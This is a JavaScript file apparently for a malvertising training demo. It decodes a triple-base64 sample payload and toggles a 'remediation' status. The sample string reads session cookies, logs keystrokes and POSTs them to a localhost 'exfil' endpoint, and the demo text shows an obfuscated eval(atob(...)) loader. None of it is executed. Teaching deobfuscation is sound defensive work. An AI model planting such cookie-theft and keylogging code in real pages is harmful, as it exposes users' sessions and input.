(function () {
  const REMEDIATION_KEYS = {
    enabled: "rema_ad_remediation_enabled",
    updatedAt: "rema_ad_remediation_updated_at"
  };

  const input = document.getElementById("obfuscatedInput");
  const loadBtn = document.getElementById("loadBtn");
  const decodeBtn = document.getElementById("decodeBtn");
  const clearBtn = document.getElementById("clearBtn");
  const decodeStatus = document.getElementById("decodeStatus");
  const sampleCode = document.getElementById("sampleCode");
  const decodedCode = document.getElementById("decodedCode");
  const toggleRemediationBtn = document.getElementById("toggleRemediationBtn");
  const remediationStatus = document.getElementById("remediationStatus");
  const remediationMeta = document.getElementById("remediationMeta");

  const plain = [
    "/* payload preview */",
    "const sessionCookie = document.cookie;",
    "document.addEventListener('keydown', (e) => console.log('[CAPTURE]', e.key));",
    "fetch('http://localhost:4000/api/exfil', {",
    "  method: 'POST',",
    "  headers: {'Content-Type': 'application/json'},",
    "  body: JSON.stringify({cookie: sessionCookie, host: location.hostname, ts: Date.now()})",
    "});"
  ].join("\n");

  const layer0 = btoa(plain);
  const layer1 = btoa(layer0);
  const layer2 = btoa(layer1);

  function looksLikeBase64(value) {
    return /^[A-Za-z0-9+/=\r\n]+$/.test(value) && value.replace(/[\r\n]/g, "").length >= 16;
  }

  function extractPayload(rawText) {
    const text = (rawText || "").trim();
    if (!text) {
      return "";
    }

    const fromKey = text.match(/PAYLOAD_B64_2\s*=\s*([A-Za-z0-9+/=]+)/i);
    if (fromKey && fromKey[1]) {
      return fromKey[1].replace(/\s+/g, "");
    }

    const fromObfuscatedJs = text.match(/_0x[\w$]*\s*=\s*['"]([A-Za-z0-9+/=]{30,})['"]/i);
    if (fromObfuscatedJs && fromObfuscatedJs[1]) {
      return fromObfuscatedJs[1].replace(/\s+/g, "");
    }

    const fromVar = text.match(/["']([A-Za-z0-9+/=]{30,})["']/);
    if (fromVar && fromVar[1]) {
      return fromVar[1].replace(/\s+/g, "");
    }

    const compact = text.replace(/\s+/g, "");
    return looksLikeBase64(compact) ? compact : "";
  }

  function decodeLayers(encoded) {
    let output = encoded;
    let rounds = 0;

    while (rounds < 6 && looksLikeBase64(output)) {
      try {
        output = atob(output);
        rounds += 1;
      } catch (_error) {
        break;
      }

      if (/console\.log|document|fetch\(|addEventListener|function|const|var/.test(output)) {
        break;
      }
    }

    return { output, rounds };
  }

  function isRemediationEnabled() {
    try {
      return localStorage.getItem(REMEDIATION_KEYS.enabled) === "true";
    } catch (_error) {
      return false;
    }
  }

  function setRemediationEnabled(enabled) {
    const now = new Date().toLocaleString();
    localStorage.setItem(REMEDIATION_KEYS.enabled, String(enabled));
    localStorage.setItem(REMEDIATION_KEYS.updatedAt, now);
  }

  function renderRemediationStatus() {
    if (!remediationStatus || !toggleRemediationBtn || !remediationMeta) {
      return;
    }

    const enabled = isRemediationEnabled();
    const updatedAt = localStorage.getItem(REMEDIATION_KEYS.updatedAt);

    if (enabled) {
      remediationStatus.textContent = "Status: Remediation active (safe ad enforced)";
      remediationStatus.classList.add("applied");
      toggleRemediationBtn.textContent = "Disable Remediation";
    } else {
      remediationStatus.textContent = "Status: Compromised ad mode active";
      remediationStatus.classList.remove("applied");
      toggleRemediationBtn.textContent = "Apply Remediation";
    }

    remediationMeta.textContent = `Last update: ${updatedAt || "not applied"}`;
  }

  if (loadBtn) {
    loadBtn.addEventListener("click", function () {
      const demoText = [
        "# ByteScope downloaded artifact",
        "FILE: api-credits-tool-obfuscated.txt",
        `PAYLOAD_B64_2=${layer2}`,
        `OBFUSCATED_JS=var _0x7f='${layer2}';eval(atob(atob(_0x7f)));`
      ].join("\n");

      if (input) {
        input.value = demoText;
      }
      sampleCode.textContent = layer2;
      decodedCode.textContent = "Decoded script output will appear here.";
      if (decodeStatus) {
        decodeStatus.textContent = "Demo payload loaded. Click Decode Layers.";
      }
    });
  }

  if (decodeBtn) {
    decodeBtn.addEventListener("click", function () {
      if (!input) {
        return;
      }

      const payload = extractPayload(input.value);

      if (!payload) {
        sampleCode.textContent = "No valid obfuscated payload found in the input.";
        decodedCode.textContent = "Decode failed: expected base64 payload text.";
        if (decodeStatus) {
          decodeStatus.textContent = "Decode failed. Paste a valid payload and try again.";
        }
        return;
      }

      sampleCode.textContent = payload;

      try {
        const result = decodeLayers(payload);
        decodedCode.textContent = result.output;
        if (decodeStatus) {
          decodeStatus.textContent = `Decoded successfully in ${result.rounds} layer(s).`;
        }
      } catch (_error) {
        decodedCode.textContent = "Decode failed: invalid sample format.";
        if (decodeStatus) {
          decodeStatus.textContent = "Decode failed: invalid payload format.";
        }
      }
    });
  }

  if (clearBtn) {
    clearBtn.addEventListener("click", function () {
      if (input) {
        input.value = "";
      }
      sampleCode.textContent = "No payload extracted yet.";
      decodedCode.textContent = "Decoded script output will appear here.";
      if (decodeStatus) {
        decodeStatus.textContent = "Waiting for input.";
      }
    });
  }

  if (toggleRemediationBtn) {
    toggleRemediationBtn.addEventListener("click", function () {
      setRemediationEnabled(!isRemediationEnabled());
      renderRemediationStatus();
    });
  }

  renderRemediationStatus();
})();
